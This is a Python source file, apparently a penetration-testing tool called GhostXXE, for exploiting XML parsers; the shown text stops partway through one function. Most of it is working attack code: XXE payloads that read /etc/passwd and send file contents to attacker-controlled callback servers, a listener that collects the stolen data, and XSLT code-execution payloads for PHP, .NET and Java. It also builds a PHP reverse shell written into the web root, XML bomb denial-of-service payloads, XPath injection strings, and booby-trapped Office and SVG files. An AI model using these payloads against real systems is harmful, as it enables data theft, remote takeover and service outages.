#!/usr/bin/env python3
"""
GhostXXE - Advanced XML Exploitation Framework
Ghost Ops Security - Professional Penetration Testing Tool

Comprehensive XML External Entity (XXE) exploitation tool for web application security testing.
Includes discovery, exploitation, OOB data exfiltration, and reverse shell capabilities.

Author: Ghost Ops Security
Version: 2.0
"""

import argparse
import sys
import os
import requests
import urllib3
import base64
import threading
import socket
import re
import time
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Tuple, Optional
from colorama import Fore, Back, Style, init

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


class Colors:
    """Color definitions for terminal output"""
    HEADER = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    INFO = Fore.BLUE + Style.BRIGHT
    PAYLOAD = Fore.MAGENTA
    RESET = Style.RESET_ALL


class Banner:
    """Display tool banner -- Ghost Ops house style (figlet small, Harley orange)"""

    ORANGE = '\033[38;5;208m'
    GREY = '\033[38;5;240m'

    ART = r"""
  ___  _  _   ___   ___  _____  __  ____  ____  __ ___
 / __|| || | / _ \ / __||_   _| \ \/ /\ \/ /\ \/ /| __|
| (_ || __ || (_) |\__ \  | |    >  <  >  <  >  < | _|
 \___||_||_| \___/ |___/  |_|   /_/\_\/_/\_\/_/\_\|___|
"""

    TAGLINE = ("Ghost Ops Security  |  Kill Chain Replay(TM) -- XML Track  |  "
               "Advanced XML Exploitation Framework v2.1 | Authorized Use Only")

    FEATURES = (
        "  [+] XXE Discovery, Parser Fingerprinting & Protocol Enumeration\n"
        "  [+] Encoding/WAF Bypass Batteries & Local DTD Enumeration\n"
        "  [+] XSLT & XPATH Injection Testing\n"
        "  [+] OOB Exfiltration, File Harvesting & Interactive Exploitation"
    )

    @staticmethod
    def show():
        use_color = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None
        if use_color:
            print(f"{Banner.ORANGE}{Banner.ART}{Style.RESET_ALL}")
            print(f"{Banner.GREY}{Banner.TAGLINE}{Style.RESET_ALL}")
            print(f"{Banner.GREY}{'-' * 78}{Style.RESET_ALL}")
            print(f"{Colors.SUCCESS}{Banner.FEATURES}{Colors.RESET}")
            print(f"{Banner.GREY}{'-' * 78}{Style.RESET_ALL}")
        else:
            print(Banner.ART)
            print(Banner.TAGLINE)
            print('-' * 78)
            print(Banner.FEATURES)
            print('-' * 78)


class OOBServer(BaseHTTPRequestHandler):
    """Out-of-Band HTTP/FTP server for data exfiltration"""
    
    captured_data = []
    dtd_payload = ""
    
    def log_message(self, format, *args):
        """Custom logging"""
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        print(f"\n{Colors.SUCCESS}[+] OOB Callback Received!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Path: {self.path}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Headers: {Colors.RESET}")
        for header, value in self.headers.items():
            print(f"    {header}: {value}")
        
        # Capture data from URL parameters
        if '?' in self.path:
            data = self.path.split('?')[1]
            print(f"\n{Colors.SUCCESS}[+] Exfiltrated Data:{Colors.RESET}")
            print(f"{Colors.PAYLOAD}{data}{Colors.RESET}")
            OOBServer.captured_data.append(data)
        
        # Serve DTD file if requested
        if self.path.endswith('.dtd'):
            self.send_response(200)
            self.send_header('Content-type', 'application/xml-dtd')
            self.end_headers()
            self.wfile.write(OOBServer.dtd_payload.encode())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK')
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print(f"\n{Colors.SUCCESS}[+] OOB POST Received!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Path: {self.path}{Colors.RESET}")
        print(f"{Colors.SUCCESS}[+] Exfiltrated Data:{Colors.RESET}")
        print(f"{Colors.PAYLOAD}{post_data.decode('utf-8', errors='ignore')}{Colors.RESET}")
        OOBServer.captured_data.append(post_data.decode('utf-8', errors='ignore'))
        
        self.send_response(200)
        self.end_headers()


class PayloadGenerator:
    """Generate XXE, XSLT, and XPATH payloads"""
    
    @staticmethod
    def xxe_basic_file_read(file_path: str) -> List[str]:
        """Basic XXE file read payloads"""
        payloads = [
            # Standard XXE
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]>
<root>&xxe;</root>''',
            
            # Parameter entity
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file://{file_path}">
<!ENTITY callhome SYSTEM "file:///etc/hostname">
]>
<root>&callhome;</root>''',
            
            # PHP wrapper base64
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}"> ]>
<root>&xxe;</root>''',
            
            # UTF-7 encoding
            f'''<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]>
<root>&xxe;</root>'''
        ]
        return payloads
    
    @staticmethod
    def xxe_oob_http(callback_url: str, file_path: str) -> Tuple[str, str]:
        """Out-of-band XXE via HTTP"""
        dtd_payload = f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfiltrate;'''
        
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<root></root>'''
        
        return xml_payload, dtd_payload
    
    @staticmethod
    def xxe_oob_ftp(callback_ip: str, file_path: str) -> Tuple[str, str]:
        """Out-of-band XXE via FTP"""
        dtd_payload = f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://{callback_ip}:2121/?%file;'>">
%eval;
%exfiltrate;'''
        
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback_ip}/evil.dtd"> %xxe;]>
<root></root>'''
        
        return xml_payload, dtd_payload
    
    @staticmethod
    def xxe_error_based(file_path: str) -> str:
        """Error-based XXE for blind exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<root></root>'''
    
    @staticmethod
    def xxe_local_dtd_linux(file_path: str) -> str:
        """Local DTD exploitation for Linux"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file://{file_path}">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Test</message>'''
    
    @staticmethod
    def xxe_local_dtd_windows(file_path: str) -> str:
        """Local DTD exploitation for Windows"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file:///{file_path}">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ENTITY test "test"'>
    %local_dtd;
]>
<foo>anything</foo>'''
    
    @staticmethod
    def xinclude_attack() -> str:
        """XInclude XXE attack"""
        return '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>'''
    
    @staticmethod
    def svg_xxe(callback_url: str, file_path: str) -> str:
        """SVG-based XXE"""
        return f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "{callback_url}/evil.dtd">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg">
<text x="15" y="100">XXE via SVG</text>
<flowRoot>
<flowRegion>
<rect x="0" y="0" width="200" height="200"/>
</flowRegion>
<flowDiv>
<flowPara>&exfil;</flowPara>
</flowDiv>
</flowRoot>
</svg>'''
    
    @staticmethod
    def soap_xxe(callback_url: str) -> str:
        """SOAP-based XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd"> %dtd;]><xxx/>]]>
</foo>
</soap:Body>
</soap:Envelope>'''
    
    @staticmethod
    def xslt_rce_php() -> List[str]:
        """
        XSLT Remote Code Execution for PHP
        Includes payloads for file_get_contents and system functions
        """
        payloads = [
            # file_get_contents for LFI
            '''<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />''',
            
            # system for RCE
            '''<xsl:value-of select="php:function('system','id')" />''',
            
            # Full stylesheet with file_get_contents
            '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
</xsl:template>
</xsl:stylesheet>''',
            
            # Full stylesheet with system command
            '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('system','id')" />
</xsl:template>
</xsl:stylesheet>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','/etc/passwd')" />
</body>
</html>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('system','id')" />
</body>
</html>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','cat /etc/passwd')" />
</xsl:template>
</xsl:stylesheet>'''
        ]
        return payloads
    
    @staticmethod
    def xslt_rce_dotnet() -> str:
        """XSLT Remote Code Execution for .NET"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string execute(){
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName= "C:\\\\windows\\\\system32\\\\cmd.exe";
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.Arguments = "/c whoami";
    proc.Start();
    proc.WaitForExit();
    return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>
<xsl:template match="/">
--- BEGIN OUTPUT ---
<xsl:value-of select="user:execute()"/>
--- END OUTPUT ---
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_file_read() -> str:
        """XSLT file read using document()"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_file_read_value_of(file_path: str = "/etc/passwd") -> str:
        """XSLT file read using value-of (cleaner output)"""
        return f'''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <result>
            <xsl:value-of select="document('{file_path}')"/>
        </result>
    </xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_embedded_stylesheet(file_path: str = "/etc/passwd") -> str:
        """XSLT with embedded stylesheet (for injection scenarios)"""
        return f'''<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
<!DOCTYPE root [
  <!ATTLIST xsl:stylesheet id ID #REQUIRED>
]>
<root>
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <filedata>
        <xsl:value-of select="document('{file_path}')"/>
      </filedata>
    </xsl:template>
  </xsl:stylesheet>
  <data>injection_point</data>
</root>'''
    
    @staticmethod
    def xslt_with_foreach_file_enum() -> str:
        """XSLT using for-each to enumerate file contents"""
        return '''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <results>
            <xsl:for-each select="document('/etc/passwd')/*">
                <entry><xsl:value-of select="."/></entry>
            </xsl:for-each>
        </results>
    </xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_system_property_enum() -> str:
        """XSLT to enumerate system properties (processor info)"""
        return '''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <sysinfo>
            <version><xsl:value-of select="system-property('xsl:version')"/></version>
            <vendor><xsl:value-of select="system-property('xsl:vendor')"/></vendor>
            <vendor-url><xsl:value-of select="system-property('xsl:vendor-url')"/></vendor-url>
        </sysinfo>
    </xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_conditional_file_read(file_path: str = "/etc/passwd") -> str:
        """XSLT with conditional (if) for file reading"""
        return f'''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:if test="document('{file_path}')">
            <found>
                <xsl:value-of select="document('{file_path}')"/>
            </found>
        </xsl:if>
    </xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_file_read_unparsed_text(file_path: str = "/etc/passwd") -> str:
        """
        XSLT 2.0 file read using unparsed-text
        Note: Only works with XSLT 2.0 processors (Saxon, etc.)
        """
        return f'''<xsl:value-of select="unparsed-text('{file_path}', 'utf-8')" />'''
    
    @staticmethod
    def xslt_file_read_unparsed_text_full(file_path: str = "/etc/passwd") -> str:
        """Full stylesheet with unparsed-text (XSLT 2.0)"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<r>
<xsl:value-of select="unparsed-text('{file_path}', 'utf-8')" />
</r>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_ssrf(target_url: str) -> str:
        """XSLT SSRF payload"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('{target_url}')"/>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xpath_injection_payloads() -> List[str]:
        """XPATH injection test payloads"""
        return [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "admin' or '1'='1",
            "' or 1=1--",
            "') or ('1'='1",
            "' or 1=1#",
            "1' or '1' = '1",
            "' or '1'='1'--",
            "' or 'a'='a"
        ]
    
    @staticmethod
    def xxe_reverse_shell_php(attacker_ip: str, attacker_port: int) -> Tuple[str, str]:
        """Generate PHP reverse shell via XXE"""
        php_reverse_shell = f'''<?php
$sock=fsockopen("{attacker_ip}",{attacker_port});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''
        
        encoded_shell = base64.b64encode(php_reverse_shell.encode()).decode()
        
        # Payload to write the shell
        write_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php">
]>
<root>{encoded_shell}</root>'''
        
        # Payload to execute the shell
        execute_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost/shell.php">
]>
<root>&xxe;</root>'''
        
        return write_payload, execute_payload
    
    @staticmethod
    def xxe_expect_rce(command: str) -> str:
        """XXE with expect wrapper for RCE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://{command}"> ]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_jar_protocol(jar_url: str) -> str:
        """XXE using JAR protocol"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:{jar_url}!/test.txt">
]>
<root>&xxe;</root>'''
    
    # ═══════════════════════════════════════════════════════════════
    # PAYLOADSALLTHETHINGS COMPREHENSIVE XXE PAYLOADS
    # ═══════════════════════════════════════════════════════════════
    
    @staticmethod
    def xxe_classic_file_read(file_path: str) -> str:
        """Classic XXE file read"""
        return f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY file SYSTEM "file://{file_path}" >
]>
<data>&file;</data>'''
    
    @staticmethod
    def xxe_php_wrapper_base64(file_path: str) -> str:
        """PHP wrapper base64 encode (bypass special chars)"""
        return f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}" >
]>
<foo>&xxe;</foo>'''
    
    @staticmethod
    def xxe_php_expect_rce(command: str) -> str:
        """PHP expect RCE (requires expect module)"""
        # Replace spaces with $IFS for XML safety
        safe_cmd = command.replace(' ', '$IFS')
        return f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://{safe_cmd}" >
]>
<foo>&xxe;</foo>'''
    
    @staticmethod
    def xxe_xinclude_file_read(file_path: str) -> str:
        """XInclude attack (when DTD modification not possible)"""
        return f'''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file://{file_path}"/></foo>'''
    
    @staticmethod
    def xxe_svg_file_read(file_path: str) -> str:
        """XXE in SVG file upload"""
        return f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://{file_path}" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''
    
    @staticmethod
    def xxe_denial_of_service_billion_laughs() -> str:
        """Billion Laughs DoS attack"""
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
    
    @staticmethod
    def xxe_utf7_encoded(file_path: str) -> str:
        """UTF-7 encoded XXE for WAF bypass"""
        return f'''+ADw?xml version="1.0" encoding="UTF-7"?+AD4
+ADwAIQ-DOCTYPE foo+AFs
+ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM "file://{file_path}"+AD4
+AF0+AD4
+ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4'''
    
    @staticmethod
    def xxe_parameter_entities_bypass(file_path: str) -> str:
        """Parameter entities (bypass some filters)"""
        return f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>'''
    
    # ═══════════════════════════════════════════════════════════════
    # ADVANCED PAYLOADS - Integrated from advanced_payloads.py
    # ═══════════════════════════════════════════════════════════════
    
    @staticmethod
    def xxe_jar_rce(jar_url: str) -> str:
        """JAR protocol exploitation (Java environments)"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:{jar_url}!/META-INF/MANIFEST.MF">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_netdoc_protocol() -> str:
        """NetDoc protocol for Java (directory listing)"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "netdoc:/etc/">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_gopher_ssrf(target_host: str, target_port: int, payload: str) -> str:
        """Gopher protocol for SSRF exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "gopher://{target_host}:{target_port}/_{payload}">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_data_uri_base64(data: str) -> str:
        """Data URI scheme with base64"""
        encoded = base64.b64encode(data.encode()).decode()
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "data:text/plain;base64,{encoded}">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_billion_laughs() -> str:
        """Billion Laughs DoS attack (XML bomb)"""
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
    
    @staticmethod
    def xxe_quadratic_blowup() -> str:
        """Quadratic Blowup DoS attack"""
        return '''<?xml version="1.0"?>
<!DOCTYPE kaboom [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>'''
    
    @staticmethod
    def xxe_utf7_bypass() -> str:
        """UTF-7 encoding for WAF bypass"""
        return '''+ADw?xml version="1.0" encoding="UTF-7"?+AD4
+ADw!DOCTYPE foo+AFs
+ADwAIQ-ENTITY xxe SYSTEM "file:///etc/passwd"+AD4
+AF0+AD4
+ADw-root+AD4AJg-xxe+ADs+ADw-/root+AD4'''
    
    @staticmethod
    def xslt_exsl_file_write(file_path: str, content: str) -> str:
        """XSLT file write using EXSLT"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exsl="http://exslt.org/common"
extension-element-prefixes="exsl"
version="1.0">
<xsl:template match="/">
<exsl:document href="{file_path}" method="text">
{content}
</exsl:document>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_java_runtime_exec(command: str) -> str:
        """XSLT Java Runtime.exec() exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
<xsl:template match="/">
<xsl:variable name="rtobject" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtobject,'{command}')"/>
<xsl:text>Command executed</xsl:text>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_php_wrapper_include(file_path: str) -> str:
        """XSLT PHP wrapper for file inclusion"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','{file_path}')" />
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_xss_payload() -> str:
        """XSLT XSS injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<script>alert('XSS via XSLT')</script>
</body>
</html>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xpath_blind_boolean_injection(condition: str, position: int) -> str:
        """Blind XPATH boolean injection"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>admin' and substring(password,{position},1)='{condition}</query>
</root>'''
    
    @staticmethod
    def xpath_union_injection() -> str:
        """XPATH union-based injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>' | //user/password | '</query>
</root>'''
    
    @staticmethod
    def xpath_count_injection() -> str:
        """XPATH count() function injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>' or count(//user)>0 or ''='</query>
</root>'''
    
    @staticmethod
    def docx_xxe_payload(callback_url: str) -> dict:
        """Generate DOCX with XXE payload"""
        document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>XXE Test Document</w:t>
</w:r>
</w:p>
</w:body>
</w:document>'''
        return {
            'document.xml': document_xml,
            'instructions': 'Inject this into word/document.xml inside the DOCX ZIP'
        }
    
    @staticmethod
    def xlsx_xxe_payload(callback_url: str) -> dict:
        """Generate XLSX with XXE payload"""
        sheet_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1">
<c r="A1" t="s">
<v>0</v>
</c>
</row>
</sheetData>
</worksheet>'''
        return {
            'sheet1.xml': sheet_xml,
            'instructions': 'Inject this into xl/worksheets/sheet1.xml inside the XLSX ZIP'
        }
    
    @staticmethod
    def pptx_xxe_payload(callback_url: str) -> dict:
        """Generate PPTX with XXE payload"""
        slide_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>XXE in PowerPoint</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>'''
        return {
            'slide1.xml': slide_xml,
            'instructions': 'Inject this into ppt/slides/slide1.xml inside the PPTX ZIP'
        }
    
    @staticmethod
    def svg_xxe_rce(callback_url: str, command: str) -> str:
        """SVG with XXE for RCE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
